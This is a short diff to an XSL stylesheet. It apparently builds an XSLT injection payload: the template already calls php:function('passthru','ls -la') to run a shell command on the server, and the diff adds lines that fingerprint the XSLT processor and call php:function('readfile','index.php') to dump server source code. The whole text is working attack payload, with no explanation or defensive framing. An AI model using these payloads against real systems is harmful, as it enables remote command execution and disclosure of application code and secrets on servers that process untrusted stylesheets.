@@ -10,6 +10,8 @@
     <p>
     <xsl:value-of select="description"/>
     <xsl:value-of select="php:function('passthru','ls -la')"/>
+    <xsl:value-of select="system-property('xsl:vendor')"/>
+    <xsl:value-of select="php:function('readfile','index.php')" />
     <span style="font-style:italic"> (<xsl:value-of select='prct'/> %)</span>
     </p>
   </div>
